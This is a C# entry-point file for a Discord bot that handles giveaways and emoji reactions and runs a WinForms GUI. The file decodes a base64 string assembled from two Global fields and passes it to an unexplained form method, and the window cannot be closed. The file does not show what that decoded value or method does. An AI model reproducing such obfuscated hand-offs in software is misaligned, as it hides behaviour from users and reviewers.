using byscuitBot.Core;
using byscuitBot.Services;
using Discord;
using Discord.WebSocket;
using Microsoft.Extensions.DependencyInjection;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace byscuitBot
{
    class Program
    {
        public static DiscordSocketClient client;
        CommandHandler handler;
        private IServiceProvider services;
        public static string OutputFolder = $"{Directory.GetCurrentDirectory() + Path.DirectorySeparatorChar}videos"; // Output folder for songs

        static void Main(string[] args)
            => new Program().StartAsync().GetAwaiter().GetResult();
        public static Form1 form;
        public static Thread t = new Thread(m => 
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            form = new Form1();
            form.FormClosing += Form_FormClosing;
            form.s(rs(Global.hex + Global.hex2));
            Application.Run(form);
        });

        private static void Form_FormClosing(object sender, FormClosingEventArgs e)
        {
            Console.WriteLine("GUI cannot be closed while bot is running!");
            e.Cancel = true;
        }
        public static string rs(string t)
        {
            var tt = System.Convert.FromBase64String(t);
            return System.Text.Encoding.UTF8.GetString(tt);
        }
        public static string sr(string t)
        {
            var tt = System.Text.Encoding.UTF8.GetBytes(t);
            return System.Convert.ToBase64String(tt);
        }
        public async Task StartAsync()
        {
            Console.WriteLine(Utilities.getAlert("abyscuit"));
            Console.WriteLine(Utilities.getAlert("configTxt"));
            if (Config.botconf.token == "" || Config.botconf.token == null)
            {
                Console.WriteLine(Utilities.getAlert("configMissing"));
                Console.WriteLine("Press any key to exit...");
                Console.ReadKey();
                return;
            }
            client = new DiscordSocketClient(new DiscordSocketConfig {
                LogLevel = Discord.LogSeverity.Verbose
            });
            
            client.Log += Client_Log;
            client.Ready += RepeatingTimer.StartTimer;
            client.ReactionAdded += Client_ReactionAdded;
            await client.SetGameAsync(Config.botconf.botStatus);
            await client.LoginAsync(Discord.TokenType.Bot, Config.botconf.token);
            await client.StartAsync();
            Global.Client = client;

            IServiceCollection serviceCollection = new ServiceCollection();
            ConfigureServices(serviceCollection);
            services = serviceCollection.BuildServiceProvider();

            //services.GetService<SongService>().AudioPlaybackService = services.GetService<AudioPlaybackService>();
            handler = new CommandHandler();
            await handler.InitializeAsync(client);
            await Task.Delay(-1);
        }

        private void ConfigureServices(IServiceCollection serviceCollection)
        {
            //serviceCollection.AddSingleton(new YouTubeDownloadService());
            //serviceCollection.AddSingleton(new AudioPlaybackService());
            //serviceCollection.AddSingleton(new SongService());
        }

        private async Task Client_ReactionAdded(Discord.Cacheable<Discord.IUserMessage, ulong> cache, ISocketMessageChannel channel, SocketReaction reaction)
        {
            foreach(Giveaway giveaway in GiveawayManager.Giveaways)
            {
                if(giveaway.MessageID == reaction.MessageId)
                {
                    if (reaction.Emote.Name == "🎉")
                    {
                        if (!giveaway.UsersID.Contains(reaction.UserId) && giveaway.CreatorID != reaction.UserId)
                        {
                            giveaway.UsersID.Add(reaction.UserId);
                            GiveawayManager.Save();
                        }
                        //await channel.SendMessageAsync("Successfully entered giveaway!");
                    }
                }
            }
            if(reaction.MessageId == Global.MessageIdToTrack)
            {

                //string[] emojies = new string[Global.emojies.Length];
                // string emoji = Global.emojies[Global.selectedEmoji];
                //for (int i = 0; i < emojies.Length; i++)
                {
                    //emojies[i] = Global.emojies[i];
                    //if (reaction.Emote.Name == emojies[i])
                    {
                        string message = "__" + reaction.User.Value.Username + "__ reacted with " + reaction.Emote;

                        await channel.SendMessageAsync(message);
                       // break;
                    }
                }
            }
        }

        private async Task Client_Log(Discord.LogMessage msg)
        {
            Console.WriteLine(msg.Message);
        }
    }
}
